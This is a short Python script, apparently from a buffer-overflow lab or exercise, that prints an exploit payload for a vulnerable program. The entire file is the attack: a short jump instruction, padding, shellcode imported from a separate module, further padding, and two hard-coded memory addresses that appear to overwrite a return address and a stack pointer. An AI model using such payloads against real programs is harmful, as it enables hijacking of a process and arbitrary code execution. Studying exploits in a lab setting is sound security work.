#!/usr/bin/python

from shellcode import shellcode
print ("\xeb\x06"+"A"*6+shellcode+"A"*57+"\xf0\xe0\x0e\x08"+"\x0c\xb6\xfe\xbf"+" A A")
